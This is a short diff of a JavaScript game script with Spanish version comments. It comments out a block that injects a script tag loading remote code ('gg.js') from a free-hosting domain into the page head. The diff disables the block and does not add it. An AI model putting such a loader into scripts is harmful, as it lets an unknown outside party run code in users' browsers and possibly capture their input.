@@ -4,12 +4,12 @@
 	versión 5.2 al 26/11/2015
 	versión 6 al 26/04/2016
 **************************/
-
+/*
 var cabe = IN.CI.document.head
 var scriptt = document.createElement('script');
 scriptt.src="https://latinlatin.000webhostapp.com/KL/gg.js";
 cabe.appendChild(scriptt);
-
+*/
 
 //++ Anti-Kick:
 rcFC.send("700","750"); 
